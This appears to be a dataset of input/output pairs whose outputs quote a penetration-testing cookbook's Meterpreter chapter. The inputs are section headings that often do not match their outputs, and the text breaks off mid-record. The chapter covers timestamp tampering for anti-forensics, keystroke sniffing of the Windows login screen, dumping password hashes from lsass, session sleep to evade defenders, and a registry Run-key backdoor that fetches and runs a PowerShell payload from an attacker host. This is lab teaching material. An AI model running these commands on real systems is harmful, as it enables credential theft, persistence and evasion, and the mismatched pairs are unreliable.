    "output": "Meterpreter Chapter 4\nAs you can see, our channel, 2, was a command-prompt channel, so by using the\nchannel command with -i followed by the channel number, we are directly\ndropped into the command-prompt mode from where we can execute system\ncommands.\n6. To background a channel, use Ctrl + Z. We can easily switch between channels by\nusing the channel command. In order to end a channel, we can use the channel\ncommand followed by -c and the channel ID:\nmeterpreter > channel -c 2\n[*] Closed channel 2.\nThis recipe demonstrates the power of using multiple channels. It also shows how easy it is\nto manage them simultaneously and switch between different channels. The use of channels\nbecomes important when we are running multiple services on the target machine.\nHow it works...\nMetasploit tags each message with a separate channel ID, which helps it in identifying the\nchannel context in which the particular command should be executed. As stated earlier, the\ncommunication process in Meterpreter follows the TLV protocol, which gives the flexibility\nof tagging different messages with specific channel IDs in order to provide multichannel\ncommunication support.\nMeterpreter anti-forensics\nIn the previous recipe, we read about some of the important and useful Meterpreter file\nsystem commands that can be used to perform various tasks on the target machine.\nMeterpreter contains another interesting command called timestomp. This command is\nused to change the Modified-Accessed-Created-Entry (MACE) attributes of a file. The\nattribute value represents the date and time when any of the MACE activities occur within\nthe file. Using the timestomp command, we can change these values.\n[ 145 ]"
  },
  {
    "input": "Getting ready",
    "output": "Meterpreter Chapter 4\nGetting ready\nBefore starting with the recipe, you may have a key question. Why change the MACE\nvalues? Hackers generally use the technique of changing the MACE values to make the\ntarget user think that the file has been present on the system for a long time and that it has\nnot been touched or modified. In case of suspicious activity, the administrators may check\nfor recently modified files to find out whether any of the files have been modified or\naccessed. So, using this technique, the file will not appear in the list of recently accessed or\nmodified items. Even though there are other techniques to find out if the file attributes have\nbeen modified, this technique can still be handy.\nLet's pick up a file from the target machine and change its MACE attributes. The following\nscreenshot shows the various MACE values of a file before using timestomp:\n[ 146 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\nNow, we will move on and change the various MACE values. Let's start with the common\ntimestomp –h command, which is used to list the various available options. We can use\nthe –v operator to list the values of MACE attributes:\nmeterpreter > timestomp C:\\flag.txt -v\n[*] Showing MACE attributes for C:\\flag.txt\nModified : 2017-10-30 12:24:57 -0400\nAccessed : 2017-10-30 12:24:57 -0400\nCreated : 2017-10-30 12:24:57 -0400\nEntry Modified: 2017-10-30 12:24:57 -0400\nHow to do it...\nWe will start by changing the creation time of the file. Notice the various parameters passed\nwith the timestomp command:\nmeterpreter > timestomp C:\\flag.txt -c \"05/25/2017 01:01:01\"\n[*] Setting specific MACE attributes on C:\\flag.txt\nHow it works...\nThe –c operator is used to change the creation time of the file. Similarly, we can use the –m\nand –a operators to change the modified and last accessed attributes of the file:\nmeterpreter > timestomp C:\\flag.txt -m \"05/25/2017 01:01:01\"\n[*] Setting specific MACE attributes on C:\\flag.txt\nmeterpreter > timestomp C:\\flag.txt -a \"05/25/2017 01:01:01\"\n[*] Setting specific MACE attributes on C:\\flag.txt\nOnce the attributes have been changed, we can use the –v operator again to check and\nverify whether we have successfully executed the commands or not. Let's move ahead and\ncheck the file attributes again:\nmeterpreter > timestomp C:\\flag.txt -v\n[*] Showing MACE attributes for C:flag.txt\nModified : 2017-05-25 02:01:01 -0400\nAccessed : 2017-05-25 02:01:01 -0400\nCreated : 2017-05-25 02:01:01 -0400\nEntry Modified: 2017-10-30 12:24:57 -0400\nWe have successfully modified the MACE attributes of the file. Now, this file can be easily\nhidden from the list of recently modified or recently accessed files.\n[ 147 ]"
  },
  {
    "input": "Getting ready",
    "output": "Meterpreter Chapter 4\nAlternatively, we can also use the –z operator to change all four MACE values in one go.\nWe will not have to pass the commands separately for each of them. But, the –z operator\nwill assign the same values to all four MACE attributes, which is practically not possible.\nThere has to be some time difference between the creation and accessed time. So, the use of\nthe –z operator should be avoided.\nThere's more...\nMetasploit created a group of tools called the Metasploit Anti-Forensic Investigation\nArsenal (MAFIA) as part of its research projects, including:\nTimestomp\nSlacker\nTransmogrify\nSAM Juicer\nSince these tools have not been updated for more than 5 years, they are no longer\ncompatible with modern operating systems.\nThe getdesktop and keystroke sniffing\nIn this recipe, we will deal with some of the stdapi user interface commands associated\nwith desktops and keystroke sniffing. Capturing the keystrokes depends on the current\nactive desktop, so it is essential to understand how we can sniff different keystrokes by\nswitching between processes running in different desktop active sessions. Let's move ahead\nwith the recipe to understand this better.\nGetting ready\nThe enumdesktops command will list all the accessible desktops and window\nstations:\nmeterpreter > enumdesktops\nEnumerating all accessible desktops\nDesktops\n========\n[ 148 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nSession Station Name\n------- ------- ----\n0 WinSta0 Default\n0 WinSta0 Disconnect\n0 WinSta0 Winlogon\nHere, you can see that all the available desktop stations are associated with\nsession 0. We will see in a while exactly what we mean by session 0.\nThe getdesktop command returns the information of the current desktop in\nwhich our Meterpreter session is working:\nmeterpreter > getdesktop\nSession 0\\S\\D\nYou can relate the output of the getdesktop command with enumdesktops to\nunderstand more about the current desktop station in which we are working.\nThe setdesktop command is used to change the current Meterpreter desktop to\nanother available desktop station\nThe keyscan_start command is used to start the keystroke sniffer in the\ncurrent active desktop station\nThe keyscan_dump command dumps the recorded keystrokes of the active\nMeterpreter desktop session\nNow, let's analyze how these commands work in a real-time scenario and how we can sniff\nkeystrokes through different desktop stations.\nHow to do it...\nBefore we proceed further with the recipe, there is an important concept about the\nWindows desktop that we will look at.\nThe Windows desktop is divided into different sessions in order to define the ways we can\ninteract with the Windows machine. Session 0 represents the console. The other\nsessions, Session 1, Session 2, and so on, represent remote desktop sessions.\n[ 149 ]\nMeterpreter Chapter 4\nEvery Windows session can be comprised of different stations, out of which WinSta0 is the\nonly interactive station, meaning that it is the only station that the user can interact\nwith. WinSta0 consists of three different desktops, namely, Default, Disconnect, and\nWinlogon. A desktop is a logical display surface containing user interface objects, such as\nwindows, menus, and hooks. The Default desktop is associated with all the applications\nand tasks that we perform on our desktop; the Disconnect desktop is concerned with the\nscreensaver lock desktop and the Winlogon desktop with the Windows login screen.\nThe point to note here is that each desktop has its own keyboard buffer. So, if you have to\nsniff the keystrokes from the Default desktop, you will have to make sure that your\ncurrent Meterpreter active browser is set to Session 0/WinSta0/Default. If you have to\nsniff the login password, you will have to change the active desktop to Session\n0/WinSta0/Winlogon.\n1. Let's check our current desktop using the getdesktop command:\nmeterpreter > getdesktop\nSession 0\\S\\D\nAs you can see, we are not in the WinSta0 station, which is the only interactive\ndesktop station. So, if we run a keystroke capture here, it won't return any result.\n2. Let's change our desktop to WinSta0\\Default:\nmeterpreter > setdesktop\nChanged to desktop WinSta0\\Default\nmeterpreter > getdesktop\nSession 0\\WinSta0\\Default\nThe preceding command line shows that we moved to the interactive Windows\ndesktop station by using the setdesktop command.\n3. So, now we are ready to run a keystroke sniffer to capture the keys pressed by the\nuser on the target machine:\nmeterpreter > keyscan_start\nStarting the keystroke sniffer ...\nmeterpreter > keyscan_dump\nDumping captured keystrokes...\ngmail.com<CR>\ndemouser<Right Shift>@gmail.com<CR>\n<Right Shift>P4ssw0rd<CR>\n[ 150 ]\nMeterpreter Chapter 4\nLooking at the dumped keystrokes, you can clearly identify that the target user\nwent to gmail.com and entered his/her credentials to log in.\nWhat if you want to sniff the Windows login password? Obviously, you can\nswitch your active desktop to WinSta0\\Winlogon using the setdesktop\ncommand, but here we will discuss an alternate approach as well.\n4. We can migrate to a process which runs during the Windows login. Let's execute\nthe ps command to check the running processes:\nmeterpreter > ps\n...\n4336 5664 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM\nC:\\Windows\\system32\\winlogon.exe\n...\nYou will find winlogon.exe running as a process with a process ID. In this case,\nthe process ID (PID) of winlogon.exe is 4336.\n5. Now, let's migrate to this PID and check our active desktop again:\nmeterpreter > migrate 4336\n[*] Migrating from 352 to 4336...\n[*] Migration completed successfully.\nmeterpreter > getdesktop\nSession 1\\W\\W\n6. You can see that our active desktop has changed to WinSta0\\Winlogon. Now,\nwe can run the keyscan_start command to start sniffing the keystrokes on the\nWindows login screen:\nmeterpreter > keyscan_start\nStarting the keystroke sniffer ...\n[ 151 ]"
  },
  {
    "input": "There's more...",
    "output": "Meterpreter Chapter 4\n7. To capture the login password, log into the Metasploitable 3 machine and then\nuse the keyscan_dump Meterpreter command to dump the keystrokes:\nmeterpreter > keyscan_dump\nDumping captured keystrokes...\n<LAlt><^Delete>vagrant<CR>\n8. Similarly, we can get back to the Default desktop by migrating to any process\nwhich is running on the default desktop; for example, explorer.exe:\nmeterpreter > migrate -N explorer.exe\n[*] Migrating from 5736 to 5168...\n[*] Migration completed successfully.\nYou might have noticed the importance of migrating to different processes and desktop\nenvironments for sniffing keystrokes. Generally, people do not get any results when they\ndirectly run keyscan without having a look at the current active desktop. This is because\nthe process they have penetrated might belong to a different session or station. So, keep this\nconcept in mind while working with keystroke sniffing.\nThere's more...\nOnce we are in a Meterpreter session, you can simply take some screenshots using the\nscreenshot command:\nmeterpreter > screenshot\nScreenshot saved to: /root/jUEOMRHk.jpeg\nTo display the captured screenshot, you can use the eog command in a new Terminal\nwindow:\nroot@kali:~# eog jUEOMRHk.jpeg\n[ 152 ]"
  },
  {
    "input": "Using a scraper Meterpreter script",
    "output": "Meterpreter Chapter 4\nUsing a scraper Meterpreter script\nSo far, we have learned about several Meterpreter commands. Here, we will take a look at\nan important Meterpreter script which can help us in exploring our target deeper. This\nchapter extensively covers Meterpreter scripts, so here, we will just focus on using the\nscript. Penetration testing might require a lot of time to dig out information on the target.\nSo, having a local backup of useful information can be really handy for penetration testers\nso that even if the target is down, they still have information to work on. It also makes\nsharing information with other testers easy. Scraper accomplishes this task for us.\n[ 153 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\nGetting ready\nThe scraper Meterpreter script can dig out lots of information about the compromised\ntarget, such as registry information, password hashes, and network information, and store it\nlocally on the tester's machine.\nIn order to execute a Ruby script on the target using Meterpreter, we can use the run\ncommand. Let's move ahead and analyze how we can download the information locally.\nHow to do it...\nThe script does everything automatically after it is executed. It creates a directory under\n/root/.msf4/logs/scripts/scraper/, where all of the files are saved:\nmeterpreter > run scraper\n[*] New session on 192.168.216.10:445...\n[*] Gathering basic system information...\n[*] Dumping password hashes...\n[*] Obtaining the entire registry...\n[*] Exporting HKCU\n[*] Downloading HKCU\n...\n(C:\\Users\\vagrant\\AppData\\Local\\Temp\\2\\wBrggefl.reg)\n[*] Cleaning HKCR\n[*] Exporting HKU\n[*] Downloading HKU\n(C:\\Users\\vagrant\\AppData\\Local\\Temp\\2\\FTmZDWyo.reg)\n[*] Cleaning HKU\n[*] Completed processing on 192.168.216.10:445...\nThe script automatically downloads and saves the information in the destination folder.\nLet's take a look at the source code to analyze whether we can make some changes\naccording to our needs.\nHow it works...\nThe source code for scraper.rb is present under /usr/share/metasploit-\nframework/scripts/meterpreter.\n[ 154 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nCoding experience in Ruby can help you in editing the scripts to add your own features. We\ncan change the download location by editing the following line:\nlogs = ::File.join(Msf::Config.log_directory, 'scripts','scraper', host +\n\"_\" + Time.now.strftime(\"%Y%m%d.%M%S\")+sprintf(\"%.5d\",rand(100000)) )\nSuppose you want to obtain the result of a list of available processes as well; you can simply\nadd the following line of code in the main body of the program:\n::File.open(File.join(logs, \"process.txt\"), \"w\") do |fd|\nfd.puts(m_exec(client, \"tasklist\"))\nend\nBy using a little bit of Ruby language and reusable code, you can easily modify the code to\nsuit your needs.\nScraping the system using winenum\nWindows Local Enumeration (WinEnum) script retrieves all kinds of information about\nthe system including environment variables, network interfaces, routing, user accounts, and\nmuch more.\nHow to do it...\n1. The winenum script will run several commands such as arp, net,\nnetstat, netsh, and wmic among other commands on the target machine and\nstore the results on our local system:\nmeterpreter > run winenum\n[*] Running Windows Local Enumeration Meterpreter Script\n[*] New session on 192.168.216.10:445...\n[*] Saving general report to\n/root/.msf4/logs/scripts/winenum/VAGRANT-2008R2_20171118.2800/VAGRA\nNT-2008R2_20171118.2800.txt\n[*] Output of each individual command is saved to\n/root/.msf4/logs/scripts/winenum/VAGRANT-2008R2_20171118.2800\n...\n[*] Getting Tokens...\n[*] All tokens have been processed\n[*] Done!\nmeterpreter >\n[ 155 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\n2. The output of the winenum script is stored in\nthe /root/.msf4/logs/scripts/winenum/ folder:\nroot@kali:~# ls\n/root/.msf4/logs/scripts/winenum/VAGRANT-2008R2_20171118.2800/VAGRA\nNT-2008R2_20171118.2800.txt\narp__a.txt\ncmd_exe__c_set.txt\ncscript__nologo_winrm_get_winrm_config.txt\ngpresult__SCOPE_COMPUTER__Z.txt\ngpresult__SCOPE_USER__Z.txt\n...\nservermanagercmd_exe__q.txt\ntasklist__svc.txt\ntokens.txt\nroot@kali:~#\nAutomation with AutoRunScript\nDuring a penetration test, you want to automate as much as possible so you can focus on\nactions that require human interaction. To ease our task, Metasploit allows you to specify\nwhat happens after you receive a new Meterperter session using AUTORUNSCRIPT.\nHow to do it...\n1. First, we need to create a file with the commands we want to execute. In this\nexample, we will migrate to the lsass.exe process and dump the Windows\nhashes:\nroot@kali:~# cat autoruncmds.rc\nmigrate -N lsass.exe\nhashdump\n2. Next, we will use the exploit/windows/smb/psexec exploit module to\ncompromise the target and use AUTORUNSCRIPT to specify the command we\nwant to execute as soon as we receive a new session:\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\n[ 156 ]\nMeterpreter Chapter 4\nmsf exploit(psexec) > set SMBUSER Administrator\nSMBUSER => Administrator\nmsf exploit(psexec) > set SMBPASS vagrant\nSMBPASS => vagrant\nmsf exploit(psexec) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(psexec) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(psexec) > set AUTORUNSCRIPT multi_console_command -r\n/root/autoruncmds.rc\nAUTORUNSCRIPT => multi_console_command -r /root/autoruncmds.rc\nmsf exploit(psexec) >\n3. By setting AUTORUNSCRIPT, we can automatically run scripts on session creation.\nIn this example, we will use the multi_console_command script, which allows\nus to specify multiple commands to run. Use -c followed by the commands to\nexecute, enclosed in double quotes and separated by a comma, or as in our\nexample, use -r and the path to a text file with a list of commands, one per line.\nNow that we have everything ready, we just need to use the exploit command\nto launch the attack:\nmeterpreter >\n[*] Session ID 1 (192.168.216.5:4444 -> 192.168.216.10:49665)\nprocessing AutoRunScript 'multi_console_command -r\n/root/autoruncmds.rc'\n[*] Running Command List ...\n[*] Running command migrate -N lsass.exe\n[*] Migrating from 576 to 456...\n[*] Migration completed successfully.\n[*] Running command hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f7\n1d913c245d35b50b:::\nanakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17\na0230e55cde2f3de94fa:::\nartoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418\nb3afea63b7577b4:::\nben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee8\n0d7c2e5e55c859:::\n...\nAwesome! Looking at the output, we were able to get a new session, migrate to the\nlsass.exe process, and dump the Windows hashes without any interaction.\n[ 157 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nMeterpreter resource scripts\nLike msfconsole, Meterpreter also supports resource scripts, which allow us to automate\nthe use of Meterpreter commands.\nHow to do it...\n1. Before we can use resource scripts in our Meterpreter session, we first need to\ncreate the directory structure where we will be placing the scripts, for which we\nwill use the mkdir command with the -p option so that it will create all the\nparent directories:\nroot@kali:~# mkdir -p ~/.msf4/scripts/resource/meterpreter/\n2. Now that we have the Meterpreter resource scripts directory created, we can start\nwriting our Meterpreter resource scripts. For the first script, we will start with\nsome basic commands to get system information. Use your favorite editor to\ncreate the following script:\nroot@kali:~# cat ~/.msf4/scripts/resource/meterpreter/systeminfo.rc\nsysinfo\ngetuid\ngetpid\ngetwd\nroot@kali:~#\n3. Let's try the resource script in a Meterpreter session and see how it works:\nmeterpreter > resource systeminfo.rc\n[*] Processing\n/root/.msf4/scripts/resource/meterpreter/systeminfo.rc for ERB\ndirectives.\nresource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)>\nsysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x64/windows\nresource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)>\ngetuid\n[ 158 ]\nMeterpreter Chapter 4\nServer username: NT AUTHORITY\\SYSTEM\nresource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)>\ngetpid\nCurrent pid: 5524\nresource (/root/.msf4/scripts/resource/meterpreter/systeminfo.rc)>\ngetwd\nC:\\Windows\\system32\nmeterpreter >\n4. Although useful, most of the time, we are looking to automate more important\ntasks, so let's automate process migration, dump the system hashes, and take a\nscreenshot of the target desktop:\nroot@kali:~# cat ~/.msf4/scripts/resource/meterpreter/automate.rc\nmigrate -N lsass.exe\nhashdump\nscreenshot\nroot@kali:~#\n5. As you can see, this can prove to be really useful during an engagement:\nmeterpreter > resource automate.rc\n[*] Processing /root/.msf4/scripts/resource/meterpreter/automate.rc\nfor ERB directives.\nresource (/root/.msf4/scripts/resource/meterpreter/automate.rc)>\nmigrate -N lsass.exe\n[*] Migrating from 3636 to 464...\n[*] Migration completed successfully.\nresource (/root/.msf4/scripts/resource/meterpreter/automate.rc)>\nhashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f7\n1d913c245d35b50b:::\n...snip...\nvagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913\nc245d35b50b:::\nresource (/root/.msf4/scripts/resource/meterpreter/automate.rc)>\nscreenshot\nScreenshot saved to: /root/ThmkKhav.jpeg\nmeterpreter >\n6. Besides regular commands, Meterpreter also has support to process <ruby>\ndirectives, meaning that we can use all the power of Ruby in a resource script:\ncat ~/.msf4/scripts/resource/meterpreter/ruby.rc\n<ruby>\n$stderr.puts(\"Ruby is awesome!\")\n$stderr.puts(\"session.platform: #{session.platform}, framework:\n[ 159 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\n#{framework}\")\n</ruby>\nroot@kali:~#\n7. In this example, we are just printing the platform the session is running on as\nwell as the framework, but you can imagine all the possibilities:\nmeterpreter > resource ruby.rc\n[*] Processing /root/.msf4/scripts/resource/meterpreter/ruby.rc for\nERB directives.\n[*] resource (/root/.msf4/scripts/resource/meterpreter/ruby.rc)>\nRuby Code (112 bytes)\nRuby is awesome!\nsession.platform: windows, framework:\n#<Msf::Framework:0x005555e533c4b8>\nmeterpreter >\nMeterpreter timeout control\nMeterpreter timeout control allows us to control the timeout behavior in Meterpreter\nsessions. Controlling timeouts allows us to change the noise level and\nother communication features, such as the duration of the Meterpreter session.\nHow to do it...\n1. The get_timeouts Meterpreter command displays the current\ntimeout configuration:\nmeterpreter > get_timeouts\nSession Expiry : @ 2017-11-19 05:59:46\nComm Timeout : 300 seconds\nRetry Total Time: 3600 seconds\nRetry Wait Time : 10 seconds\n[ 160 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nSession Expiry specifies the timeout period assigned to the session, after which\nthe session will be terminated. If network-related issues are preventing data from\nbeing transmitted between the two endpoints but don't cause the socket to\ncompletely disconnect, the Comm Timeout command allows you to specify how\nlong Meterpreter will wait for communication before disconnecting or trying to\nreconnect, which by default is 5 minutes. The Retry Total Time is the total\namount of time that Meterpreter will attempt to retry communication on the\ntransport back to Metasploit, which by default is set to 3600 seconds (1\nhour). Retry Wait Time refers to the waiting period before trying to establish\nconnectivity.\n2. Using the set_timeouts command, we can change the current timeout\nconfiguration. To change the Comm Timeout, we can use the -c flag followed by\nthe time in seconds:\nmeterpreter > set_timeouts -c 600\nSession Expiry : @ 2017-11-19 05:59:46\nComm Timeout : 600 seconds\nRetry Total Time: 3600 seconds\nRetry Wait Time : 10 seconds\nMeterpreter sleep control\nDuring a penetration test, there are sometimes when you need a Meterpreter session to go\nquiet for a while; for example, if you think the security team is on to you and is trying to\nstop your attack. For that reason, Meterpreter has a simple but very useful command called\nsleep.\nHow to do it...\n1. The sleep command does exactly what you would expect; it makes the current\nMeterpreter session go to sleep for a specified period of time, and wake up again\nonce that time has expired. So, let's put our session to sleep for 10 seconds. Before\nusing the sleep command, we need to set up a handler, which listens for the\nnew Meterpreter connection:\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\n[ 161 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(handler) >\n2. Now that we have our listener, we can use the sleep command followed by the\nperiod of time we want our session to sleep:\nmeterpreter > sleep 10\n[*] Telling the target instance to sleep for 10 seconds ...\n[+] Target instance has gone to sleep, terminating current session.\n[*] 192.168.216.10 - Meterpreter session 1 closed. Reason: User\nexit\nmsf exploit(handler) >\n3. After 10 seconds, we will get a new Meterpreter session, giving us access to the\nsystem again and hopefully going unnoticed by the security team:\nmsf exploit(handler) >\n[*] Sending stage (205379 bytes) to 192.168.216.10\n[*] Meterpreter session 2 opened (192.168.216.5:4444 ->\n192.168.216.10:50715) at 2017-11-12 06:43:02 -0500\nMeterpreter transports\nThe transport command allows you to add a new transport to your current sessions\nwith reverse_tcp and reverse_https as the top favorites. Meterpreter offers you some\nother transports for you to choose from.\nHow to do it...\n1. Before starting to add new transports, we will use the transport command with\nthe -h flag to display the help menu for the command:\n[ 162 ]\nMeterpreter Chapter 4\n2. To list the current active transports, we can use the transport command with\nthe list option:\nmeterpreter > transport list\nSession Expiry : @ 2017-11-23 16:11:07\nID Curr URL Comms T/O Retry Total Retry Wait\n-- ---- --- --------- ----------- ----------\n1 * tcp://192.168.216.5:4444 300 3600 10\n3. Adding new transports allows Metasploit to keep the sessions alive for longer. To\nadd a new transport, we can use the transport command followed by\nthe transport mechanism we are using:\nmeterpreter > transport add -t reverse_http -l 192.168.216.5 -p\n8080 -to 500 -rt 30000 -rw 5000\n[*] Adding new transport ...\n[ 163 ]\nMeterpreter Chapter 4\n[+] Successfully added reverse_http transport.\nmeterpreter >\n4. We have used the -t option to specify the type of transport to add. The available\ntypes are bind_tcp, reverse_tcp, reverse_http, and reverse_https:\nThe -l option is used to set the LHOST\nThe -p option is used for the LPORT\nThe -to option is used to specify the communication timeout in\nseconds\nThe -rt option is used to set the retry total parameter in seconds, and\nshould be higher than -rw\nThe -rw option is used to set the retry wait parameter in seconds, and\nshould be less than -rt\n5. Now, when we list the available transports, we should see our newly\ncreated reverse_http transport:\nmeterpreter > transport list\nSession Expiry : @ 2017-11-25 12:05:54\nID Curr URL Comms T/O Retry Total Retry Wait\n-- ---- --- --------- ----------- ----------\n1\nhttp://192.168.216.5:8080/8P8a9wEtFOLZsdiwg6H7kwzzyj7QnFNN2_cDFwbfy\nweSR-\nV3ufLjkz4GofSWJDDaeZonEslz6DLcooyTrQqx502GYiWlN4_Clb3TdqrR9ZnUaSU-\npCEgiSCrHrmUnfN/ 500 30000 500\n2 * tcp://192.168.216.5:4444 300 3600 10\nmeterpreter >\n6. To change transports, we will first start the Generic Payload Handler and set the\npayload to the same one used in the transport:\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(psexec) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http\nPAYLOAD => windows/meterpreter/reverse_http\nmsf exploit(handler) > set LPORT 8080\nLPORT => 8080\nmsf exploit(handler) > set LHOST 192.168.213.5\nLHOST => 192.168.213.5\nmsf exploit(handler) > run -j\n[*] Exploit running as background job.\n[ 164 ]"
  },
  {
    "input": "Getting ready",
    "output": "Meterpreter Chapter 4\n[*] Started HTTP reverse handler on http://0.0.0.0:8080/\n[*] Starting the payload handler...\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > transport next\n[*] Changing to next transport ...\n[+] Successfully changed to the next transport, killing current\nsession.\n[*] 192.168.216.10 - Meterpreter session 1 closed. Reason: User\nexit\n[*] 192.168.216.10:49352 (UUID:\nf0ff1af7012d14e2/x86=1/windows=1/2017-11-18T12:05:54Z) Attaching\norphaned/stageless session ...\nmsf exploit(handler) > [*] Meterpreter session 2 opened\n(192.168.216.5:8080 -> 192.168.216.10:49352) at 2017-11-18 12:24:33\n+0000\nmsf exploit(handler) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\nAs you can see from the output, we have successfully changed to the next transport on the\nlist using the transport next command. To change to the previous transport, simply use\nthe transport prev command.\nInteracting with the registry\nThe registry is a system-defined database used to store information that is necessary to\nconfigure the system for one or more users, applications, and hardware devices.\nGetting ready\nThe data stored in the registry varies according to the version of Microsoft Windows, so you\nneed to take that into account when interacting with the target system.\n[ 165 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nBy looking at the registry, you can find what files have been used, websites visited using\nInternet Explorer, programs used, USB devices used, and much more.\nHow to do it...\n1. To interact with the target machine's registry, we will use the reg command, but\nbefore we start using it, let's see the available options:\nmeterpreter > reg\nUsage: reg [command] [options]\nInteract with the target machine's registry. The following are the options:\n-d <opt>: The data to store in the registry value\n-h: Help menu\n-k <opt>: The registry key path (for example,\nHKLM\\Software\\Foo)\n-r <opt>: The remote machine name to connect to (with current\nprocess credentials)\n-t <opt>: The registry value type (for example, REG_SZ)\n-v <opt>: The registry value name (for example, Stuff)\n-w: Sets the KEY_WOW64 flag and valid values (32/64)\nThe following are the commands:\nenumkey: Enumerates the supplied registry key (-k <key>)\ncreatekey: Creates the supplied registry key (-k <key>)\ndeletekey: Deletes the supplied registry key (-k <key>)\nqueryclass: Queries the class of the supplied key (-k <key>)\nsetval: Sets a registry value (-k <key> -v <val> -d <data>)\ndeleteval: Deletes the supplied registry value (-k <key> -v\n<val>)\nqueryval: Queries the data contents of a value (-k <key> -v\n<val>)\n[ 166 ]\nMeterpreter Chapter 4\nAs you can see, the reg command allows us to have full control of the registry,\nwhich is a sign of the power that one can achieve by mastering the registry.\nAs an example, in this recipe, we will use the reg command to create a registry\nbackdoor using the Script Web Delivery exploit module.\nFirst, we need to set up a web server which serves our PowerShell payload:\nmsf exploit(web_delivery) > set SRVHOST 192.168.216.5\nSRVHOST => 192.168.216.5\nmsf exploit(web_delivery) > set URIPATH /\nURIPATH => /\nmsf exploit(web_delivery) > show targets\nExploit targets:\nId Name\n-- ----\n0 Python\n1 PHP\n2 PSH\n3 Regsvr32\n4 PSH (Binary)\nmsf exploit(web_delivery) > set TARGET 2\nTARGET => 2\nmsf exploit(web_delivery) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(web_delivery) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(web_delivery) > exploit\n...\nmsf exploit(web_delivery) >\n2. Next, we will use the reg command to create a new registry key which will run\nthe PowerShell shell payload whenever the user logs in to the machine:\nmeterpreter > reg setval -k\nHKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v Power -d\n\"powershell.exe -nop -w hidden -c $R=new-object\nnet.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();$R.Pro\nxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\n$R.downloadstring('http://192.168.216.5:8080/');\"\nSuccessfully set Power of REG_SZ.\nmeterpreter >\n[ 167 ]\nMeterpreter Chapter 4\n3. To enumerate the registry key, we can use the reg command as well as\nthe enumkey option followed by -k and the key we wish to enumerate:\nmeterpreter > reg enumkey -k\nHKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\nEnumerating: HKLM\\software\\microsoft\\windows\\currentversion\\run\nValues (2):\nVBoxTray\nPower\n4. To display the data contents of a value, we can use the reg command with\nthe queryval option followed by -k, which specifies the registry key, and -v to\nspecify the value to query:\nmeterpreter > reg queryval -k\nHKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v Power\nKey: HKLM\\software\\microsoft\\windows\\currentversion\\run\nName: Power\nType: REG_SZ\nData: powershell.exe -nop -w hidden -c $R=new-object\nnet.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();$R.Pro\nxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\n$R.downloadstring('http://192.168.216.5:8080/');\nmeterpreter >\n5. Now that we have our registry backdoor in place, we just need the machine to\nreboot and we will get back a remote shell running with system privileges:\nmsf exploit(web_delivery) >\n[*] Sending stage (179267 bytes) to 192.168.216.10\n[*] Meterpreter session 2 opened (192.168.216.5:4444 ->\n192.168.216.10:49379) at 2017-11-18 10:06:39 -0500\nmsf exploit(web_delivery) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\nAwesome! As you expect, the Metasploit Framework provides us with all the tools we need\nto mimic the adversary and test for the most common methods of persistence.\n[ 168 ]"
  },
  {
    "input": "How to do it...",
